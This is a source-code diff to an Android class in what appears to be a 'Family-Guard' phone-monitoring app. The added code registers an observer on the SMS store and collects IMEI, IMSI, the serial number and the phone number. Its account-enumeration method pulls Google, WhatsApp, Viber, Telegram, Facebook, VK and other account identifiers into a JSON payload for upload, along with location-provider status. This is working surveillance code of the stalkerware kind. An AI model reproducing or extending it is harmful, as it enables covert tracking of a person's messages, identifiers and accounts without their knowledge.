@@ -1,23 +1,31 @@
 package com.inet.android.info;
 
 import java.lang.reflect.Method;
+import java.text.NumberFormat;
 
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
+import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.Uri;
+import android.os.Environment;
 import android.os.Handler;
+import android.os.StatFs;
 import android.preference.PreferenceManager;
+import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
 
 import com.inet.android.request.DataRequest;
+import com.inet.android.sms.SMSBroadcastReceiver;
 import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
@@ -32,13 +40,19 @@ public class GetInfo {
 	private String LOG_TAG = "GetIfo";
 	String typeStr = "1";
 	ConvertDate date;
+	SMSBroadcastReceiver sms;
+	JSONObject info;
 
 	public GetInfo(Context mContext) {
 		GetInfo.mContext = mContext;
 	}
 
-	public void getInfo() {
+	public void startGetInfo() {
 		date = new ConvertDate();
+		SmsSentObserver observer = new SmsSentObserver(null);
+		observer.setContext(mContext);
+		mContext.getContentResolver().registerContentObserver(
+				Uri.parse("content://sms"), true, observer);
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		telephonyManager = (TelephonyManager) mContext
 				.getSystemService(Context.TELEPHONY_SERVICE);
@@ -48,30 +62,39 @@ public class GetInfo {
 		String sendJSONStr = null;
 		JSONObject jsonObject = new JSONObject();
 		JSONArray data = new JSONArray();
-		JSONObject info = new JSONObject();
+
+		info = new JSONObject();
 		JSONObject object = new JSONObject();
 		try {
-
-			info.put("brand", getBrand());
-			info.put("model", getModel());
-			info.put("imsi", getIMSI());
-			info.put("serial_number", getSerialNum());
-			info.put("manufactured", getManufactured());
-			info.put("product", getProduct());
+			info.put("Version Family-Guard", sp.getString("BUILD", "V_000.1"));
+			info.put("Manufactured", getManufactured());
+			info.put("Product", getProduct());
+			info.put("Brand", getBrand());
+			info.put("Model", getModel());
 			info.put("os_version", getVerAndroid());
-			info.put("sdk", getSDK());
+			info.put("SDK", getSDK());
+			info.put("IMSI", getIMSI());
+			info.put("Serial number", getSerialNum());
+			getFeatures();
+			info.put("Display size", getDisplayInfo());
+			info.put("SD", getSDCardReady());
+			info.put("Operator name", getOperatorName());
+			info.put("Phone type", getPhoneType());
+			info.put("Dual sim", getIsDualSIM());
+			info.put("IMEI SIM", getIMEISim1());
 
-			info.put("is_dual_sim", getIsDualSIM());
-			info.put("imei_sim1", getIsSIM1Ready());
-			info.put("imei_sim2", getIsSIM2Ready());
-			info.put("mcc", getMCC());
-			info.put("mnc", getMNC());
-			info.put("phone_type", getPhoneType());
-			info.put("network_type", getNetworkType());
-			info.put("network", getConnectType());
-			info.put("operator_name", getOperatorName());
-			info.put("screen_size", getDisplayInfo());
-			info.put("ver_app", sp.getString("BUILD", "V_000.1"));
+			if (getIsDualSIM().equals("supported"))
+				info.put("IMEI SIM2", getIMEISim2());
+			if (getNumber() != null)
+				info.put("Number", getNumber());
+			// else if (getAccaunt() != null)
+			// info.put("number", getAccaunt());
+
+			info.put("MCC", getMCC());
+			info.put("MNC", getMNC());
+			info.put("Network type", getNetworkType());
+			info.put("Network", getConnectType());
+			getAccaunt();
 
 			object.put("time", date.logTime());
 			object.put("type", typeStr);
@@ -98,7 +121,6 @@ public class GetInfo {
 		String operatorName;
 		try {
 			operatorName = telephonyManager.getSimOperatorName();
-			operatorName = " brand: " + operatorName;
 		} catch (Exception e) {
 			e.printStackTrace();
 			operatorName = "0";
@@ -114,8 +136,7 @@ public class GetInfo {
 	public String getBrand() {
 		String brand;
 		try {
-			String brandPhone = android.os.Build.BRAND;
-			brand = " Brand: " + brandPhone;
+			brand = android.os.Build.BRAND;
 		} catch (Exception e) {
 			e.printStackTrace();
 			brand = "0";
@@ -131,8 +152,7 @@ public class GetInfo {
 	public String getSDK() {
 		String SDK;
 		try {
-			int sdk_int = android.os.Build.VERSION.SDK_INT;
-			SDK = " SDK: " + Integer.toString(sdk_int);
+			SDK = Integer.toString(android.os.Build.VERSION.SDK_INT);
 		} catch (Exception e) {
 			e.printStackTrace();
 			SDK = "0";
@@ -148,8 +168,7 @@ public class GetInfo {
 	public String getOperatorName() {
 		String operatorName = null;
 		try {
-			String carrierName = telephonyManager.getNetworkOperatorName();
-			operatorName = " operatorName: " + carrierName;
+			operatorName = telephonyManager.getNetworkOperatorName();
 		} catch (Exception e) {
 			e.printStackTrace();
 			operatorName = "0";
@@ -166,8 +185,7 @@ public class GetInfo {
 	public String getIMEI() {
 		String sIMEI = null;
 		try {
-			String imeistring = telephonyManager.getDeviceId();
-			sIMEI = " IMEI: " + imeistring;
+			sIMEI = telephonyManager.getDeviceId();
 		} catch (Exception e) {
 			e.printStackTrace();
 			sIMEI = "0";
@@ -185,8 +203,7 @@ public class GetInfo {
 	public String getIMSI() {
 		String sIMSI = null;
 		try {
-			String IMSI = telephonyManager.getSubscriberId();
-			sIMSI = " IMSI: " + IMSI;
+			sIMSI = telephonyManager.getSubscriberId();
 		} catch (Exception e) {
 			e.printStackTrace();
 			sIMSI = "0";
@@ -203,8 +220,7 @@ public class GetInfo {
 	public String getVerAndroid() {
 		String verAndroid = null;
 		try {
-			String versionAndroid = android.os.Build.VERSION.RELEASE;
-			verAndroid = " Version android: " + versionAndroid;
+			verAndroid = android.os.Build.VERSION.RELEASE;
 		} catch (Exception e) {
 			e.printStackTrace();
 			verAndroid = "0";
@@ -222,8 +238,7 @@ public class GetInfo {
 	public String getManufactured() {
 		String manufactured = null;
 		try {
-			String manufacturedPhone = android.os.Build.MANUFACTURER;
-			manufactured = " Manufactured: " + manufacturedPhone;
+			manufactured = android.os.Build.MANUFACTURER;
 		} catch (Exception e) {
 			e.printStackTrace();
 			manufactured = "0";
@@ -240,8 +255,7 @@ public class GetInfo {
 	public String getProduct() {
 		String product = null;
 		try {
-			String productPhone = android.os.Build.PRODUCT;
-			product = " Product: " + productPhone;
+			product = android.os.Build.PRODUCT;
 		} catch (Exception e) {
 			e.printStackTrace();
 			product = "0";
@@ -258,8 +272,7 @@ public class GetInfo {
 	public String getModel() {
 		String model = null;
 		try {
-			String modelPhone = android.os.Build.MODEL;
-			model = " Model: " + modelPhone;
+			model = android.os.Build.MODEL;
 		} catch (Exception e) {
 			e.printStackTrace();
 			model = "0";
@@ -283,7 +296,7 @@ public class GetInfo {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		return "SerialNum: " + serialnum;
+		return serialnum;
 	}
 
 	/**
@@ -296,18 +309,18 @@ public class GetInfo {
 		String phoneTypeName = null;
 		switch (phoneType) {
 		case (TelephonyManager.PHONE_TYPE_CDMA):
-			phoneTypeName = "PHONE_TYPE_CDMA";
+			phoneTypeName = "CDMA";
 			break;
 		case (TelephonyManager.PHONE_TYPE_GSM):
-			phoneTypeName = "PHONE_TYPE_GSM";
+			phoneTypeName = "GSM";
 			break;
 		case (TelephonyManager.PHONE_TYPE_NONE):
-			phoneTypeName = "PHONE_TYPE_NONE";
+			phoneTypeName = "NONE";
 			break;
 		default:
 			break;
 		}
-		return "phoneType: " + phoneTypeName;
+		return phoneTypeName;
 	}
 
 	/**
@@ -319,35 +332,35 @@ public class GetInfo {
 		networkType = telephonyManager.getNetworkType();
 		switch (networkType) {
 		case TelephonyManager.NETWORK_TYPE_1xRTT:
-			return " networktype: " + "1xRTT";
+			return "1xRTT";
 		case TelephonyManager.NETWORK_TYPE_CDMA:
-			return " networktype: " + "CDMA";
+			return "CDMA";
 		case TelephonyManager.NETWORK_TYPE_EDGE:
-			return " networktype: " + "EDGE";
+			return "EDGE";
 		case TelephonyManager.NETWORK_TYPE_EHRPD:
-			return " networktype: " + "eHRPD";
+			return "eHRPD";
 		case TelephonyManager.NETWORK_TYPE_EVDO_0:
-			return " networktype: " + "EVDO rev. 0";
+			return "EVDO rev. 0";
 		case TelephonyManager.NETWORK_TYPE_EVDO_A:
-			return " networktype: " + "EVDO rev. A";
+			return "EVDO rev. A";
 		case TelephonyManager.NETWORK_TYPE_EVDO_B:
-			return " networktype: " + "EVDO rev. B";
+			return "EVDO rev. B";
 		case TelephonyManager.NETWORK_TYPE_GPRS:
-			return " networktype: " + "GPRS";
+			return "GPRS";
 		case TelephonyManager.NETWORK_TYPE_HSDPA:
-			return " networktype: " + "HSDPA";
+			return "HSDPA";
 		case TelephonyManager.NETWORK_TYPE_HSPA:
-			return " networktype: " + "HSPA";
+			return "HSPA";
 		case TelephonyManager.NETWORK_TYPE_HSPAP:
-			return " networktype: " + "HSPA+";
+			return "HSPA+";
 		case TelephonyManager.NETWORK_TYPE_HSUPA:
-			return " networktype: " + "HSUPA";
+			return "HSUPA";
 		case TelephonyManager.NETWORK_TYPE_IDEN:
-			return " networktype: " + "iDen";
+			return "iDen";
 		case TelephonyManager.NETWORK_TYPE_LTE:
-			return " networktype: " + "LTE";
+			return "LTE";
 		case TelephonyManager.NETWORK_TYPE_UMTS:
-			return " networktype: " + "UMTS";
+			return "UMTS";
 		case TelephonyManager.NETWORK_TYPE_UNKNOWN:
 			return "0";
 		}
@@ -375,7 +388,7 @@ public class GetInfo {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		return "network: " + network;
+		return network;
 	}
 
 	/**
@@ -387,8 +400,7 @@ public class GetInfo {
 	public String getIMEISim1() {
 		String sIMEISim1 = null;
 		try {
-			String imeiSIM1 = telephonyInfo.getImeiSIM1();
-			sIMEISim1 = " IMEI Sim1: " + imeiSIM1;
+			sIMEISim1 = telephonyInfo.getImeiSIM1();
 		} catch (Exception e) {
 			e.printStackTrace();
 			sIMEISim1 = "0";
@@ -406,8 +418,7 @@ public class GetInfo {
 	public String getIMEISim2() {
 		String sIMEISim2 = null;
 		try {
-			String imeiSIM2 = telephonyInfo.getImeiSIM2();
-			sIMEISim2 = " IMEI Sim2: " + imeiSIM2;
+			sIMEISim2 = telephonyInfo.getImeiSIM2();
 		} catch (Exception e) {
 			e.printStackTrace();
 			sIMEISim2 = "0";
@@ -423,8 +434,8 @@ public class GetInfo {
 	public String getIsSIM1Ready() {
 		String sIMEISim1Ready = null;
 		try {
-			boolean isSIM1Ready = telephonyInfo.isSIM1Ready();
-			sIMEISim1Ready = " IMEI Sim1 Ready: " + isSIM1Ready;
+			sIMEISim1Ready = Boolean.toString(telephonyInfo.isSIM1Ready());
+
 		} catch (Exception e) {
 			e.printStackTrace();
 			sIMEISim1Ready = "0";
@@ -441,8 +452,7 @@ public class GetInfo {
 	public String getIsSIM2Ready() {
 		String sIMEISim2Ready = null;
 		try {
-			boolean isSIM2Ready = telephonyInfo.isSIM2Ready();
-			sIMEISim2Ready = " IMEI Sim2 Ready: " + isSIM2Ready;
+			sIMEISim2Ready = Boolean.toString(telephonyInfo.isSIM2Ready());
 		} catch (Exception e) {
 			e.printStackTrace();
 			sIMEISim2Ready = "0";
@@ -459,14 +469,175 @@ public class GetInfo {
 	public String getIsDualSIM() {
 		String sIsDualSim = null;
 		try {
-			boolean isDualSIM = telephonyInfo.isDualSIM();
-			sIsDualSim = " isDualSim: " + isDualSIM;
+			sIsDualSim = telephonyInfo.isDualSIM();
 		} catch (Exception e) {
 			e.printStackTrace();
 			sIsDualSim = "0";
 		}
 		return sIsDualSim;
 
+	}
+
+	/**
+	 * getNumber
+	 * 
+	 * @return
+	 */
+	public String getNumber() {
+		String number = null;
+		try {
+			number = telephonyInfo.getNumber();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return number;
+
+	}
+
+	/**
+	 * getAccaunt
+	 * 
+	 * 
+	 */
+	public void getAccaunt() {
+		String accauntGoogle = null;
+
+		AccountManager am = AccountManager.get(mContext);
+		Account[] accounts = am.getAccounts();
+		String phoneNumber = null;
+
+		for (Account ac : accounts) {
+			String acname = ac.name;
+			String actype = ac.type;
+			// Take your time to look at all available accounts
+			System.out.println("Accounts : " + acname + ", " + actype);
+			if (actype.equals("com.google")) {
+				if (accauntGoogle == null)
+					accauntGoogle = acname;
+				else
+					accauntGoogle += ", " + acname;
+			} else if (actype.equals("com.whatsapp")) {
+
+				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
+					String number = acname.replace(" ", "");
+					if (number.indexOf("7") == 0) {
+						number = "+" + number;
+					}
+					if (phoneNumber != null) {
+						if (!phoneNumber.equals(number)) {
+							phoneNumber = " " + number;
+						}
+					} else
+						phoneNumber = number;
+
+					try {
+						info.put("WhatsApp", phoneNumber);
+					} catch (JSONException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+				}
+			} else if (actype.equals("com.viber.voip.account")) {
+				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
+					String number = acname.replace(" ", "");
+					if (number.indexOf("7") == 0) {
+						number = "+" + number;
+					}
+					if (phoneNumber != null) {
+						if (!phoneNumber.equals(number)) {
+							phoneNumber += " " + number;
+						}
+					} else
+						phoneNumber = number;
+
+					try {
+						info.put("Viber", acname);
+					} catch (JSONException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+
+				}
+			} else if (actype.equals("com.icq.mobile.client")) {
+				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
+					String number = acname.replace(" ", "");
+					if (number.indexOf("7") == 0) {
+						number = "+" + number;
+					}
+					if (phoneNumber != null) {
+						if (!phoneNumber.equals(number)) {
+							phoneNumber += " " + number;
+						}
+					} else
+						phoneNumber = number;
+
+					try {
+						info.put("ICQ", acname);
+					} catch (JSONException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+				}
+			} else if (actype.equals("org.telegram.account")) {
+				if (!acname.matches("(?i).*[a-zà-ÿ].*")) {
+					String number = acname.replace(" ", "");
+					if (number.indexOf("7") == 0) {
+						number = "+" + number;
+					}
+
+					if (phoneNumber != null) {
+						if (!phoneNumber.equals(number)) {
+							phoneNumber += " " + number;
+						}
+					} else
+						phoneNumber = number;
+
+					try {
+						info.put("Telegram", acname);
+					} catch (JSONException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+				}
+			} else if (actype.equals("com.skype.contacts.sync")) {
+				try {
+					info.put("Skype", acname);
+				} catch (JSONException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			} else if (actype.equals("com.vkontakte.account")) {
+				try {
+					info.put("Vkontakte", acname);
+				} catch (JSONException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			} else if (actype.equals("com.facebook.auth.login")) {
+				try {
+					info.put("Facebook", acname);
+				} catch (JSONException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			} else {
+				try {
+					info.put(actype, acname);
+				} catch (JSONException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+		}
+		try {
+			if (accauntGoogle != null)
+				info.put("Google", accauntGoogle);
+			if (phoneNumber != null)
+				info.put("Number", phoneNumber);
+		} catch (JSONException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 	/**
@@ -479,7 +650,7 @@ public class GetInfo {
 		String mcc = null;
 		try {
 			if (networkOperator != null) {
-				mcc = "MCC: " + networkOperator.substring(0, 3);
+				mcc = networkOperator.substring(0, 3);
 
 			}
 		} catch (Exception e) {
@@ -499,7 +670,7 @@ public class GetInfo {
 		String mnc = null;
 		try {
 			if (networkOperator != null) {
-				mnc = "MNC: " + networkOperator.substring(3);
+				mnc = networkOperator.substring(3);
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
@@ -519,13 +690,149 @@ public class GetInfo {
 		// Best way for new devices
 		DisplayMetrics displayMetrics = new DisplayMetrics();
 		wm.getDefaultDisplay().getMetrics(displayMetrics);
-		String str_ScreenSize = "Screen Size : " + displayMetrics.widthPixels
-				+ " x " + displayMetrics.heightPixels;
+		String str_ScreenSize = displayMetrics.widthPixels + " x "
+				+ displayMetrics.heightPixels;
 		return str_ScreenSize;
 	}
 
+	private String getSDCardReady() {
+		String SD = null;
+		StatFs stats;
+		// the total size of the SD card
+		double totalSize;
+		// the available free space
+		double freeSpace;
+		// a String to store the SD card information
+		String totalSpace;
+		String RemainingSpace;
+
+		// set the number format output
+		NumberFormat numberFormat;
+
+		if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_MOUNTED))
+			SD = "Mounted";
+		else if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_REMOVED))
+			SD = "Removed";
+		else if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_CHECKING))
+			SD = "Checking";
+		else if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_UNMOUNTED))
+			SD = "Unmounted";
+		else if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_BAD_REMOVAL))
+			SD = "Bad removal";
+		else if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_MOUNTED_READ_ONLY))
+			SD = "Mounted read only";
+		else if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_NOFS))
+			SD = "Unsupported filesystem";
+		else if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_SHARED))
+			SD = "Shared";
+		else if (Environment.getExternalStorageState().equals(
+				Environment.MEDIA_UNMOUNTABLE))
+			SD = "Cannot be mounted";
+		if (SD.equals("Mounted") || SD.equals("Unmounted")
+				|| SD.equals("Mounted read only")) {
+			// obtain the stats from the root of the SD card.
+			stats = new StatFs(Environment.getExternalStorageDirectory()
+					.getAbsolutePath());
+
+			// Add 'Total Size' to the output string:
+			// total usable size
+			totalSize = stats.getBlockCount() * stats.getBlockSize();
+
+			// initialize the NumberFormat object
+			numberFormat = NumberFormat.getInstance();
+			// disable grouping
+			numberFormat.setGroupingUsed(false);
+			// display numbers with two decimal places
+			numberFormat.setMaximumFractionDigits(2);
+
+			// Output the SD card's total size in gigabytes, megabytes,
+			// kilobytes and bytes 280
+			totalSpace = numberFormat.format((totalSize / (double) 1073741824))
+					+ " GB \n";
+
+			// Add 'Remaining Space' to the output string:
+			// available free space
+			freeSpace = stats.getAvailableBlocks() * stats.getBlockSize();
+			// freeSize = stats.getFreeBlocks()*stats.getBlockSize();
+			// Output the SD card's available free space in gigabytes,
+			// megabytes, kilobytes and bytes
+			RemainingSpace = numberFormat
+					.format((freeSpace / (double) 1073741824)) + " GB \n";
+			try {
+				info.put("Total Size", totalSpace);
+				info.put("Removing Size", RemainingSpace);
+
+			} catch (JSONException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}
+		return SD;
+	}
+
+	private void getFeatures() {
+		PackageManager pm = mContext.getPackageManager();
+		String GPS;
+		String LocationStatus;
+		String USBHost;
+		String WiFi;
+		String microphone;
+		String network;
+		if (pm.hasSystemFeature(PackageManager.FEATURE_LOCATION_GPS) == true)
+			GPS = "Available";
+		else
+			GPS = "Not available";
+		if (pm.hasSystemFeature(PackageManager.FEATURE_LOCATION_NETWORK) == true)
+			network = "Available";
+		else
+			network = "Not available";
+		String provider = Settings.Secure.getString(
+				mContext.getContentResolver(),
+				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
+		if (!provider.equals("")) {
+			// GPS Enabled
+			LocationStatus = provider;
+		} else {
+			LocationStatus = "";
+		}
+		if (pm.hasSystemFeature(PackageManager.FEATURE_USB_HOST) == true)
+			USBHost = "Available";
+		else
+			USBHost = "Not available";
+		if (pm.hasSystemFeature(PackageManager.FEATURE_WIFI) == true)
+			WiFi = "Available";
+		else
+			WiFi = "Not available";
+		if (pm.hasSystemFeature(PackageManager.FEATURE_MICROPHONE) == true)
+			microphone = "Available";
+		else
+			microphone = "Not available";
+		try {
+			if (!LocationStatus.equals(""))
+				info.put("GPS Status", LocationStatus);
+			info.put("Available location", GPS);
+			info.put("Location network", network);
+			info.put("WiFi", WiFi);
+			info.put("Microphone ", microphone);
+			info.put("USBHost", USBHost);
+
+		} catch (JSONException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+
 	public void contentObserved() {
-		SmsSentObserver smsSentObserver = new SmsSentObserver(new Handler(), mContext);
+		SmsSentObserver smsSentObserver = new SmsSentObserver(new Handler(),
+				mContext);
 		mContext.getContentResolver().registerContentObserver(
 				Uri.parse("content://sms/sent"), true, smsSentObserver);
 	}
